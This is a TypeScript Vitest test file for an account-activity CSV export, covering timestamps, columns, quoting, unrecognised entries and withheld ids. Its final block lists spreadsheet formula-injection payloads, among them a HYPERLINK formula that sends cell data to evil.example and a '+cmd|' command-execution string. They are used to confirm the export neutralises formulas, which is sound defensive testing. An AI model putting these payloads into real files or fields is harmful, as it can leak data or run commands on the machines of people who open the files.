// @vitest-environment node
import { describe, expect, it } from "vitest";

import {
  ACCOUNT_ACTIVITY_EVENT_SCHEMA,
  type AccountActivityEvent,
  type AccountActivityEventType,
} from "@/infrastructure/account-activity/events";
import type { AccountActivityEntry } from "@/infrastructure/account-activity/list-account-activity";
import { formulaCells, parseCsv } from "@/shared/test/csv";
import { CSV_UTF8_BOM } from "@/shared/utils/csv";

import {
  ACCOUNT_ACTIVITY_EXPORT_COLUMNS,
  type AccountActivityExportEntry,
  accountActivityExportFileName,
  buildAccountActivityExportCsv,
  formatAccountActivityExportTime,
  UNRECOGNISED_ACTIVITY_DETAIL,
  UNRECOGNISED_ACTIVITY_TITLE,
} from "./account-activity-export";

const AT = "2026-03-01T10:00:00.123456+00:00";

const entry = (
  id: number,
  event: AccountActivityEvent,
  occurredAt = AT,
): AccountActivityEntry => ({ id, occurredAt, event });

/** One valid example per catalogued event type. */
const EXAMPLES: Record<AccountActivityEventType, AccountActivityEvent> = {
  "profile.updated": {
    type: "profile.updated",
    details: { changes: { fullName: { from: "Jane", to: "Jane Doe" } } },
  },
  "password.changed": {
    type: "password.changed",
    details: { otherSessionsSignedOut: true },
  },
  "sessions.others_signed_out": { type: "sessions.others_signed_out", details: {} },
  "email.change_requested": {
    type: "email.change_requested",
    details: { from: "old@example.com", to: "new@example.com", resend: false },
  },
  "email.changed": { type: "email.changed", details: { to: null } },
};

/** The file as a consumer reads it: BOM checked and stripped, then parsed. */
const read = (csv: string) => {
  expect(csv.startsWith(CSV_UTF8_BOM)).toBe(true);
  return parseCsv(csv.slice(CSV_UTF8_BOM.length));
};

describe("formatAccountActivityExportTime", () => {
  it.each([
    ["2026-03-01T10:00:00+00:00", "2026-03-01T10:00:00Z"],
    ["2026-03-01T10:00:00.999999+00:00", "2026-03-01T10:00:00Z"], // truncated, not rounded
    ["2026-12-31T23:59:59.999+00:00", "2026-12-31T23:59:59Z"], // never into the next day
    ["2026-03-01T12:30:00+02:00", "2026-03-01T10:30:00Z"], // converted to UTC
    ["2026-03-01T10:00:00Z", "2026-03-01T10:00:00Z"],
  ])("%s → %s", (stored, expected) => {
    expect(formatAccountActivityExportTime(stored)).toBe(expected);
  });

  it("keeps an unparsable value as stored rather than dropping it", () => {
    expect(formatAccountActivityExportTime("not a time")).toBe("not a time");
  });
});

describe("buildAccountActivityExportCsv – layout", () => {
  it("starts with a UTF-8 BOM and the column headings", () => {
    expect(read(buildAccountActivityExportCsv([]))).toEqual([
      ["Time (UTC)", "Activity", "Details", "Event type"],
    ]);
    expect([...ACCOUNT_ACTIVITY_EXPORT_COLUMNS]).toEqual([
      "Time (UTC)",
      "Activity",
      "Details",
      "Event type",
    ]);
  });

  it("writes the time, the card's wording and the event type", () => {
    const rows = read(
      buildAccountActivityExportCsv([entry(1, EXAMPLES["profile.updated"])]),
    );

    expect(rows[1]).toEqual([
      "2026-03-01T10:00:00Z",
      "Display name changed",
      "From \u201CJane\u201D to \u201CJane Doe\u201D.",
      "profile.updated",
    ]);
  });

  it("leaves Details empty when the card shows no detail line", () => {
    const rows = read(
      buildAccountActivityExportCsv([entry(1, EXAMPLES["email.changed"])]),
    );

    expect(rows[1]).toEqual([
      "2026-03-01T10:00:00Z",
      "Email address changed",
      "",
      "email.changed",
    ]);
  });

  it("exports every event type in the catalogue with a title and its type", () => {
    const catalogued = ACCOUNT_ACTIVITY_EVENT_SCHEMA.options.map(
      (option) => option.shape.type.value,
    );
    // The examples above must stay exhaustive as the catalogue grows.
    expect(Object.keys(EXAMPLES).sort()).toEqual([...catalogued].sort());

    const rows = read(
      buildAccountActivityExportCsv(
        catalogued.map((type, i) => entry(i + 1, EXAMPLES[type])),
      ),
    ).slice(1);

    expect(rows.map((row) => row[3])).toEqual(catalogued);
    for (const row of rows) {
      expect(row[1]).not.toBe("");
      expect(row[1]).not.toBe(UNRECOGNISED_ACTIVITY_TITLE);
    }
  });

  it("keeps names with commas, quotes and line breaks intact", () => {
    const name = 'O\'Neil, "Zo\u00EB"\nsecond line';
    const rows = read(
      buildAccountActivityExportCsv([
        entry(1, {
          type: "profile.updated",
          details: { changes: { fullName: { from: null, to: name } } },
        }),
      ]),
    );

    expect(rows[1][2]).toBe(`Set to \u201C${name}\u201D.`);
  });
});

describe("buildAccountActivityExportCsv – nothing is left out", () => {
  it("lists an entry this version cannot interpret, with its time and stored type", () => {
    const rows = read(
      buildAccountActivityExportCsv([
        { unrecognised: true, id: 1, occurredAt: AT, eventType: "billing.plan_changed" },
      ]),
    );

    expect(rows[1]).toEqual([
      "2026-03-01T10:00:00Z",
      UNRECOGNISED_ACTIVITY_TITLE,
      UNRECOGNISED_ACTIVITY_DETAIL,
      "billing.plan_changed",
    ]);
  });

  it("keeps every entry given, recognised or not, in the order given", () => {
    const given: AccountActivityExportEntry[] = Array.from({ length: 300 }, (_, i) =>
      i % 10 === 3
        ? {
            unrecognised: true,
            id: 300 - i,
            occurredAt: AT,
            eventType: `future.event_${i}`,
          }
        : entry(300 - i, EXAMPLES["password.changed"]),
    );

    const rows = read(buildAccountActivityExportCsv(given)).slice(1);

    expect(rows).toHaveLength(300);
    expect(rows.map((row) => row[3])).toEqual(
      given.map((e) => ("unrecognised" in e ? e.eventType : e.event.type)),
    );
  });

  it("writes two entries with the same time and content as two rows", () => {
    const same = EXAMPLES["sessions.others_signed_out"];
    const rows = read(buildAccountActivityExportCsv([entry(2, same), entry(1, same)]));

    expect(rows).toHaveLength(3);
    expect(rows[1]).toEqual(rows[2]);
  });
});

describe("buildAccountActivityExportCsv – nothing beyond what the page shows", () => {
  it("carries no row ids and no user id", () => {
    const csv = buildAccountActivityExportCsv([
      entry(987654321, EXAMPLES["password.changed"]),
    ]);

    expect(csv).not.toContain("987654321");
    expect(read(csv)[1]).toHaveLength(ACCOUNT_ACTIVITY_EXPORT_COLUMNS.length);
  });

  it("never exports the details of an entry it cannot interpret", () => {
    // An unrecognised entry has no details field at all; even one smuggled in
    // at runtime must not reach the file.
    const smuggled = {
      unrecognised: true,
      id: 1,
      occurredAt: AT,
      eventType: "future.event",
      details: { secret: "do-not-export" },
    } as AccountActivityExportEntry;

    expect(buildAccountActivityExportCsv([smuggled])).not.toContain("do-not-export");
  });
});

describe("accountActivityExportFileName", () => {
  it("is account-activity-<UTC date>.csv", () => {
    expect(accountActivityExportFileName(new Date("2026-03-01T12:00:00Z"))).toBe(
      "account-activity-2026-03-01.csv",
    );
  });
});

describe("buildAccountActivityExportCsv – hostile text chosen by the user", () => {
  const HOSTILE = [
    '=HYPERLINK("https://evil.example/?"&A1,"Click")',
    "+cmd|' /C calc'!A0",
    "-2+3",
    "@SUM(A1:A9)",
    "\t=1+1",
    " =1+1",
    "\uFF1D1+1",
    "line one\n=1+1",
    'quote " and, comma',
  ];

  const hostileEntries = (): AccountActivityEntry[] =>
    HOSTILE.flatMap((text, i) => [
      entry(i * 10 + 1, {
        type: "profile.updated",
        details: { changes: { fullName: { from: text, to: text } } },
      }),
      entry(i * 10 + 2, {
        type: "profile.updated",
        details: { changes: { fullName: { from: null, to: text } } },
      }),
      entry(i * 10 + 3, {
        type: "email.change_requested",
        details: { from: text, to: text, resend: false },
      }),
      entry(i * 10 + 4, {
        type: "email.change_requested",
        details: { from: null, to: text, resend: true },
      }),
      entry(i * 10 + 5, { type: "email.changed", details: { to: text } }),
    ]);

  it("no cell of the file can be evaluated as a formula", () => {
    const rows = read(buildAccountActivityExportCsv(hostileEntries()));

    expect(rows).toHaveLength(1 + HOSTILE.length * 5);
    expect(formulaCells(rows)).toEqual([]);
  });

  it("keeps the hostile text itself intact inside the details", () => {
    const rows = read(buildAccountActivityExportCsv(hostileEntries())).slice(1);

    HOSTILE.forEach((text, i) => {
      expect(rows[i * 5 + 4][2]).toBe(`Now ${text}.`);
    });
  });
});
